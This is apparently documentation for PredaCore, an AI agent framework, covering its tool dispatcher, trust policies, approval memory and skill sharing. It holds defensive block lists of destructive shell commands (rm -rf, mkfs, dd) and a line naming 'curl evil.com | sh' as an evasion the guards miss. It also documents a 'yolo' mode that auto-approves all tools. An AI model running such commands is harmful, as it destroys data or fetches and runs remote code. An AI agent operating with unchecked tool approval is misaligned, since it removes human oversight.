# Tools

> 55 first-class tools. Each call runs through a real dispatcher.

Most agent frameworks wrap tool calls in `try/except` and call it a day. PredaCore's tool layer is industrial plumbing: **per-tool circuit breakers, adaptive P95 timeouts, LRU result cache, Express-style middleware, SHA-256-hashed persistent approvals, argument-level risk escalation, resumable pipelines with approval gates.** Plus a skill-crystallization system that watches execution history and turns repeated patterns into named, trust-tiered, shareable skills.

---

## The tool catalog (55 built-in)

| Category | Tools |
|---|---|
| **File ops** | `read_file` · `write_file` · `list_directory` |
| **Shell & code** | `run_command` · `python_exec` · `execute_code` (Docker multi-language sandbox) |
| **Web** | `web_search` · `web_scrape` · `deep_search` · `semantic_search` · `browser_control` |
| **Memory** | `memory_store` · `memory_recall` |
| **Voice** | `speak` · `voice_note` |
| **Desktop (macOS/Linux)** | `desktop_control` · `screen_vision` · `android_control` |
| **Agents & planning** | `multi_agent` · `strategic_plan` · `openclaw_delegate` |
| **Git** | `git_context` · `git_diff_summary` · `git_commit_suggest` · `git_find_files` · `git_semantic_search` |
| **Creative** | `image_gen` · `pdf_reader` · `diagram` |
| **Marketplace** | `marketplace_list_skills` · `marketplace_install_skill` · `marketplace_invoke_skill` |
| **Identity** | `identity_read` · `identity_update` · `journal_append` |
| **Channels** | `channel_configure` · `channel_install` |
| **Secrets** | `secret_set` · `secret_list` |
| **MCP client** | `mcp_list` · `mcp_add` · `mcp_remove` · `mcp_restart` + dynamic `mcp_<server>_<tool>` |
| **APIs** | `api_add` · `api_call` · `api_list` · `api_remove` |
| **Cron & pipeline** | `cron_task` · `tool_pipeline` |
| **Collective intelligence** | `collective_intelligence_status` · `collective_intelligence_sync` · `skill_evolve` · `skill_scan` · `skill_endorse` |
| **Debug** | `tool_stats` |

Plus **unlimited dynamic MCP tool mounting** — any MCP server you add exposes its tools as `mcp_<server>_<tool>`, indistinguishable from native tools to the LLM.

---

## The dispatch stack

Every tool call goes through this (simplified):

```
  ┌─ Middleware stack (Express-style onion) ──────────────────────┐
  │  before: logging → metrics → audit → rate_limiter → ...       │
  │                        ▼                                       │
  │                   RISK EVAL                                    │
  │                        ▼                                       │
  │                   DISPATCH                                     │
  │                        ▼                                       │
  │  after:  ... → sanitizer → truncator → audit                  │
  └───────────────────────────────────────────────────────────────┘
```

### Middleware

`tools/middleware.py:13-41`. Onion stack — before hooks run 0→N, after hooks run N→0. Built-in middleware:

- **Logging** — structured log of every call (tool, args shape, duration, outcome).
- **Metrics** — Prometheus counters + histograms.
- **Audit** — permanent record of approvals and rejections.
- **Rate limiter** — per-tool, per-session.
- **Sanitizer** — strips sensitive patterns from tool arguments before logging.
- **Truncator** — caps tool output length per `max_output_bytes` config.

A middleware can set `skip_execution = True` in the context and short-circuit the call before the handler runs. Useful for rate-limit denials, policy-level blocks.

Add your own middleware by writing a `Middleware` subclass and registering it; no core changes needed.

---

## Risk evaluation

Three signals combine to determine if a call is allowed, confirmed, or blocked:

### 1. Trust policy

`tools/registry.py:2148-2203`. Three declarative policies:

| Policy | `require_confirmation` | `auto_approve_tools` | `max_auto_exec_cost` |
|---|---|---|---|
| `yolo` | none | `*` (all) | 1e18 (functionally unlimited) |
| `normal` | 16 destructive tools | 12 read-only | config-driven |
| `paranoid` | `*` (all) | none | 0 (blocks auto-exec) |

**The 16 destructive tools in `normal`**: `write_file · run_command · python_exec · execute_code · desktop_control · screen_vision · android_control · channel_install · channel_configure · mcp_add · mcp_remove · mcp_restart · secret_set · api_add · api_call · api_remove`.

**The 12 auto-approved in `normal`**: `read_file · list_directory · web_search · web_scrape · memory_store · memory_recall · deep_search · semantic_search · pdf_reader · diagram · tool_stats · tool_pipeline`.

### 2. Arg-regex risk escalation

`tools/trust_policy.py:62-69, 269-301`. The `_CRITICAL_PATTERNS` regex list scans tool arguments for:

```
rm -rf
sudo
chmod 777
mkfs
dd if=
> /dev/
```

A match **forces risk to `critical`** regardless of the tool's base risk level. Even in `yolo` mode, `run_command("rm -rf /tmp/foo")` gets extra paint — a confirmation prompt, or a block in paranoid.

### 3. Ethical keyword guard

`tools/dispatcher.py:55-89`. Patterns:

```
delete_user_data
disable_safety
bypass_auth
drop_table
truncate_table
format_disk
```

- `paranoid`: **blocked** with `ToolError(BLOCKED)`.
- `normal`: **warned** + confirmation required.
- `yolo`: allowed (but still subject to arg-regex escalation above).

---

## Persistent approval memory

`tools/trust_policy.py:107-201`. When you approve a tool-args shape, the decision is **SHA-256-hashed and persisted** to `approvals.db`.

Next time the same tool-args shape comes up, the decision replays automatically. No re-prompting.

**What's hashed:** `(tool_name, canonicalized_args_json)`. Canonicalization strips volatile fields (timestamps, random IDs) and normalizes structure.

**What this means:** Approve `write_file` to `~/project/foo.py` once. Next session, next week, next daemon restart — approval replays. Different args (different path) → fresh prompt.

**Sharp edge:** if the approvals DB is locked at decision time, the system falls back to an in-memory cache (`tools/trust_policy.py:144-146`). That means approvals don't persist across daemon restarts in rare DB-contention scenarios. No user-facing warning yet. v0.3 work.

---

## Dispatcher — circuit breakers, adaptive timeouts, LRU cache

`tools/dispatcher.py:92-97`. Constants:

```python
CIRCUIT_BREAKER_FAILURE_THRESHOLD = 5
CIRCUIT_BREAKER_RECOVERY_TIME     = 60.0  # seconds
RESULT_CACHE_SIZE                 = 200   # LRU
EXECUTION_HISTORY_SIZE            = 500   # ring buffer
```

### Circuit breaker (per-tool)

Three states: `CLOSED` (normal) → `OPEN` (fail fast for 60s after 5 consecutive failures) → `HALF_OPEN` (single probe request). If the probe succeeds, back to CLOSED. If it fails, back to OPEN.

Prevents cascading failures — if `web_search` is down, the dispatcher stops hammering it.

### Adaptive P95 timeout tightening

The static timeouts in `tools/registry.py` are **ceilings**. The dispatcher observes actual call latencies and tightens the effective timeout to match observed P95 + a safety margin.

Slow tools fail faster. Bimodal-latency tools (`run_command`, `python_exec`, `execute_code`) skip the P95 tracker — their latency distribution is too wide for P95 to be meaningful.

### LRU result cache

For idempotent tools (flagged in the registry), results are cached keyed on `(tool, canonicalized_args)`. 200-entry LRU. Hit → return cached result without re-executing.

### Execution history ring buffer

500-entry ring buffer of `(tool, args, duration, outcome)` per agent. Feeds the skill crystallization system (see below).

---

## Tool pipelines — resumable, with approval gates

`tools/pipeline.py:1-66`. Not just chains — workflows.

```yaml
steps:
  - tool: run_command
    args:
      command: "pytest tests/"
  - tool: write_file
    approval: required                 # ← human gate
    args:
      path: "CHANGELOG.md"
      content: "{{prev.stdout}}"        # ← template substitution
  - tool: run_command
    when: "{{prev.success}}"            # ← conditional
    args:
      command: "git commit -am 'release v{{step.0.version}}'"
```

**Approval gates.** A step with `approval: required` pauses execution and returns `status: needs_approval` + a **24-hour resume token** (`_TOKEN_EXPIRY_SEC = 86400`). Call `pipeline.resume(token, approve=True)` to continue — from the next day, from another process, anywhere.

**Template substitution.** `{{prev}}`, `{{prev.key}}`, `{{step.N.key}}` — access outputs of previous steps by index or chain.

**Conditionals.** `when: "expression"` — skip step if expression is falsy.

**Parallel fan-out.** Mark a step with `parallel: true` to fan out across an array input.

**Caps.** 200 step ceiling, 1h total pipeline timeout. Non-configurable by design.

---

## Skill crystallization — agents learn compound skills

`tools/handlers/collective_intelligence.py` + `_vendor/common/skill_evolution.py`, `skill_collective.py`, `skill_scanner.py`.

The dispatcher's 500-entry execution ring buffer is watched by the `skill_evolution` system. Repeated tool sequences with high confidence are converted into **skill genomes** — named, versioned compound skills that invoke multiple tools in a defined order.

### Trust tiers

Each skill genome has a tier:

- `personal` — used only by this agent.
- `trusted` — used by agents sharing your identity-group.
- `federated` — published to the Flame pool.

### Promotion pipeline

```
observation → crystallization → endorsement → security_scan → publication
```

- **Crystallization** requires ≥3 executions with consistent outcome + confidence > 0.7.
- **Endorsement** is either explicit (user says "great, save that as a skill") or implicit (5+ successful re-uses).
- **Security scan** inspects the tool sequence for risky combinations before promotion to `federated`.

### The Flame pool

A federated skill repository. Agents can publish crystallized skills to a shared pool; other agents can `skill_scan` and `skill_endorse` to pull them in. Trust-tier-aware.

> The agent watches itself work, notices compound patterns, and crystallizes them into named, trust-tiered, shareable skills.

---

## Adaptive pre-emptive throttling

`llm_providers/router.py:353-377`. The router **prevents** 429s, not just reacts to them.

```python
_THROTTLE_RAMP_AFTER     = 3      # consecutive rapid calls
_THROTTLE_INITIAL_DELAY  = 1.0    # seconds
_THROTTLE_RAMP_FACTOR    = 1.5
_THROTTLE_MAX_DELAY      = 10.0
_THROTTLE_RAPID_WINDOW   = 5.0    # quiet window that resets
```

After 3 rapid-fire calls, the router inserts a 1.0s delay, ramping 1.5× up to 10s max. Resets after 5s of quiet.

**`auto_fallback` defaults to `False`** (`config.py:59`). When rate-limited, PredaCore tells you instead of quietly switching to a dumber model behind your back. Set `auto_fallback: True` in config if you want seamless provider switching.

---

## Tool pipelines vs. multi-agent vs. cron

Three different control planes:

| | Tool pipelines | Multi-agent | Cron |
|---|---|---|---|
| **Parallelism** | Within pipeline (`parallel: true`) | Across agents | Across scheduled jobs |
| **State** | Pipeline context | Agent memory (scoped) | Per-job outcome |
| **Approval** | Per-step with resume tokens | Per-tool by trust policy | None — runs headless |
| **Use when** | Multi-step op with human gate | Task decomposition needs agent autonomy | Recurring trigger |

---

## Rate limits and metrics

Per-tool rate limits configurable per-session. Defaults in `tools/registry.py`. Metrics exposed on the health endpoint (`daemon.webhook_port`, default 8765):

- `tool_calls_total{tool, outcome}`
- `tool_duration_seconds_bucket{tool}`
- `tool_circuit_breaker_state{tool}`
- `tool_approval_outcomes_total{tool, decision}`

---

## Limits

- **`yolo` has no real cost cap.** `max_auto_exec_cost: 1e18`. The rescue is arg-regex escalation + ethical keyword guard — catches `rm -rf`, not a cleverly obfuscated `curl evil.com | sh`.
- **Approval memory falls back to in-memory on DB lock.** Rare, but approvals don't persist across processes in that case. No user-facing warning.
- **Circuit breaker state is per-process.** On daemon restart, all breakers start CLOSED. If a tool is genuinely broken, you'll see 5 failures again before the breaker trips.
- **Skill crystallization is opt-in per-agent.** Disabled by default on `paranoid` profile.
- **Pipeline resume tokens are local to the daemon.** No distribution across nodes. HA deployments need external token storage.
- **Adaptive P95 tracker needs ~50 calls** to produce a stable estimate. Cold-start tools use static timeouts.
